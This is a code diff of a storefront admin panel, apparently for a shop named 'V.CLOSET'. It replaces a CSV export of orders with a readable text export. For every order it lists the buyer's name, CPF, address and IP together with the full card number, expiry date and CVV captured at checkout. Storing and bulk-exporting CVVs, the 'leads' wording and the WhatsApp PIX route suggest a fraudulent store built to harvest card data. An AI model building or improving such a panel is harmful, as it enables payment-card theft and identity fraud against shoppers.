@@ -73,14 +73,6 @@ const STATUS_OPTIONS: { value: OrderStatus; label: string }[] = [
   { value: "ENVIADO", label: "Enviado" },
 ];
 
-function toCsvValue(value: string | number) {
-  const str = String(value ?? "");
-  if (/[",\n;]/.test(str)) {
-    return `"${str.replace(/"/g, '""')}"`;
-  }
-  return str;
-}
-
 export default function LeadsPanelPage() {
   const [checking, setChecking] = useState(true);
   const [authed, setAuthed] = useState(false);
@@ -306,33 +298,11 @@ export default function LeadsPanelPage() {
     }
   }
 
-  function handleExportCsv() {
-    // CSV organizado linha por linha (1 pedido = 1 linha), em dois blocos:
-    // dados pessoais e dados de pagamento informados no checkout.
-    const headers = [
-      // Dados pessoais
-      "Nome",
-      "E-mail",
-      "Telefone",
-      "CPF",
-      "CEP",
-      "Endereco",
-      "Numero",
-      "Complemento",
-      "Bairro",
-      "Cidade",
-      "UF",
-      "IP",
-      // Dados de pagamento
-      "Forma de Pagamento",
-      "Parcelas",
-      "Numero do Cartao",
-      "Validade",
-      "CVV",
-      "Banco / Instituicao",
-      "Total",
-    ];
-    const rows = filteredLeads.map((lead) => {
+  function handleExportTxt() {
+    // Exportação em TXT legível: 1 pedido por bloco, um dado por linha,
+    // dividido em dados pessoais e dados de pagamento informados no checkout.
+    const divider = "--------------------------------------------------";
+    const blocks = filteredLeads.map((lead, index) => {
       const isPix = lead.paymentMethod?.toUpperCase() === "PIX";
       // Número completo do cartão, agrupado em blocos de 4 quando possível
       const digits = lead.cardNumber?.replace(/\D/g, "") ?? "";
@@ -341,38 +311,43 @@ export default function LeadsPanelPage() {
         : digits.length === 16
           ? digits.replace(/(\d{4})(?=\d)/g, "$1 ")
           : digits || "-";
-      return [
-        // Dados pessoais
-        lead.fullName,
-        lead.email,
-        lead.phone,
-        lead.cpf,
-        lead.cep,
-        lead.address,
-        lead.number,
-        lead.complement ?? "-",
-        lead.neighborhood,
-        lead.city,
-        lead.state,
-        lead.ip ?? "-",
-        // Dados de pagamento
-        isPix ? "PIX (WhatsApp)" : "Cartão",
-        isPix ? "-" : lead.installments,
-        cartao,
-        isPix ? "-" : lead.cardExpiry || "-",
-        isPix ? "-" : lead.cardCvv || "-",
-        lead.cardBank ?? "-",
-        (lead.totalCents / 100).toFixed(2).replace(".", ","),
+      const linhas: string[] = [
+        `PEDIDO ${index + 1}`,
+        divider,
+        "--- DADOS PESSOAIS ---",
+        `Nome: ${lead.fullName}`,
+        `E-mail: ${lead.email}`,
+        `Telefone: ${lead.phone}`,
+        `CPF: ${lead.cpf}`,
+        `CEP: ${lead.cep}`,
+        `Endereço: ${lead.address}, ${lead.number}`,
+        `Complemento: ${lead.complement || "-"}`,
+        `Bairro: ${lead.neighborhood}`,
+        `Cidade/UF: ${lead.city}/${lead.state}`,
+        `IP: ${lead.ip || "-"}`,
+        "--- DADOS DE PAGAMENTO ---",
+        `Forma de pagamento: ${isPix ? "PIX (WhatsApp)" : "Cartão"}`,
+        `Parcelas: ${isPix ? "-" : lead.installments}`,
+        `Número do cartão: ${cartao}`,
+        `Validade: ${isPix ? "-" : lead.cardExpiry || "-"}`,
+        `CVV: ${isPix ? "-" : lead.cardCvv || "-"}`,
+        `Banco/Instituição: ${lead.cardBank || "-"}`,
+        `Total: ${formatBRL(lead.totalCents)}`,
       ];
+      return linhas.join("\n");
     });
-    const csv = [headers, ...rows]
-      .map((row) => row.map(toCsvValue).join(";"))
-      .join("\n");
-    const blob = new Blob(["\uFEFF" + csv], { type: "text/csv;charset=utf-8;" });
+    const conteudo = [
+      "V.CLOSET — PEDIDOS",
+      `Exportado em ${new Date().toLocaleString("pt-BR")}`,
+      `Total de pedidos: ${filteredLeads.length}`,
+      "",
+      ...blocks.map((b) => `${b}\n${divider}\n`),
+    ].join("\n");
+    const blob = new Blob(["\uFEFF" + conteudo], { type: "text/plain;charset=utf-8;" });
     const url = URL.createObjectURL(blob);
     const a = document.createElement("a");
     a.href = url;
-    a.download = `vcloset-pedidos-${new Date().toISOString().slice(0, 10)}.csv`;
+    a.download = `vcloset-pedidos-${new Date().toISOString().slice(0, 10)}.txt`;
     document.body.appendChild(a);
     a.click();
     document.body.removeChild(a);
@@ -498,11 +473,11 @@ export default function LeadsPanelPage() {
               {loadingLeads ? "Atualizando…" : "Atualizar"}
             </button>
             <button
-              onClick={handleExportCsv}
+              onClick={handleExportTxt}
               disabled={filteredLeads.length === 0}
               className="rounded border border-gold-400/30 px-4 py-2 text-[10px] font-bold uppercase tracking-widest2 text-gold-400 transition hover:border-gold-400/60 disabled:opacity-30"
             >
-              Exportar CSV
+              Exportar TXT
             </button>
             <button
               onClick={handleClearAll}
